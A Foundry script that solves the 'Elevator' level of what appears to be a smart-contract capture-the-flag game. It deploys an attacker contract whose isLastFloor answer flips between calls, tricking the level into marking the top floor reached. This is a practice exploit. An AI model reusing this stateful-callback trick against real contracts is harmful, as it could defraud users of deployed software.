// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Elevator, Building} from "../src/level11/Elevator.sol";

contract Attacker is Building {
    Elevator elevator;
    bool hasCalled;

    constructor(address elevator_) {
        elevator = Elevator(elevator_);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (hasCalled) return true;

        hasCalled = true;
        return false;
    }

    function attack(uint floor) public {
        elevator.goTo(floor);
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5;

        Attacker attacker = new Attacker(levelAddr);

        attacker.attack(100);

        vm.stopBroadcast();
    }
}
